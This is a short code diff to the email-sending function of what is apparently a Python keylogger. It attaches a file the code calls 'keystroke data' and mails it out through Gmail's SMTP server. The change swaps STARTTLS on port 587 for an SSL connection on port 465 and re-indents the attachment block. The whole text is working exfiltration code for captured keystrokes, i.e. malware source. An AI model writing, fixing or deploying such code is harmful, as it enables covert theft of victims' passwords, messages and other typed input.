@@ -67,16 +67,15 @@ def send_email():
         msg.attach(MIMEText("Attached is the latest keystroke data.", 'plain'))
 
         with open(full_path, 'rb') as attach_file:
-            p = MIMEBase('application', 'octet-stream')
-            p.set_payload(attach_file.read())
-            encoders.encode_base64(p)
-            p.add_header('Content-Disposition', f"attachment; filename={keys_information}")
-            msg.attach(p)
+                  p = MIMEBase('application', 'octet-stream')
+                  p.set_payload(attach_file.read())
+                  encoders.encode_base64(p)
+                  p.add_header('Content-Disposition', f"attachment; filename={keys_information}")
+                  msg.attach(p)
 
-        with smtplib.SMTP('smtp.gmail.com', 587) as s:
-            s.starttls()
-            s.login(email_address, password)
-            s.sendmail(email_address, toaddr, msg.as_string())
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as s:
+                  s.login(email_address, password)
+                  s.sendmail(email_address, toaddr, msg.as_string())
 
         last_email_time = time.time()
         fast_typing_mode = False  # Reset fast mode after email is sent
